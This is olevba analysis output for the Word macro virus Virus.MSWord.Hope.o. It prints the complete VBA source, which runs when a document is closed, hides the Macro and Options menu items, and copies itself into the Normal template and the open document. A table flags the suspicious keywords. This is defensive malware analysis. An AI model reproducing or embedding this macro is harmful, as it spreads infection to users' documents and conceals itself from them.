olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hope.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hope.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close(): On Error Resume Next
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
CommandBars("Tools").Controls("Macro").Delete: CommandBars("Tools").Controls("Options...").Delete
Set CM = MacroContainer.VBProject.VBComponents.Item(1).CodeModule
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
MC = CM.Lines(1, CM.CountOfLines)
ad.DeleteLines 1, ad.CountOfLines: ad.AddFromString MC
nt.DeleteLines 1, nt.CountOfLines: nt.AddFromString MC
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

